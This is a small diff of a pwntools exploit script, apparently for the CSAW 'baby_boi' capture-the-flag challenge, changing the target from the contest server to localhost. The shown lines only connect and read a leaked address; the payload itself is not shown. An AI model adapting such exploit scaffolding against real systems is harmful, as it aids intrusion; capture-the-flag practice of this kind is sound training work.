@@ -4,7 +4,7 @@ from pwn import *
 
 context.log_level = 'debug'
 # r = process("./baby_boi")
-r = remote("pwn.chal.csaw.io", 1005)
+r = remote("localhost", 12312)
 
 r.recvuntil(":")
 leak = int(r.recvuntil("\n"), 16)
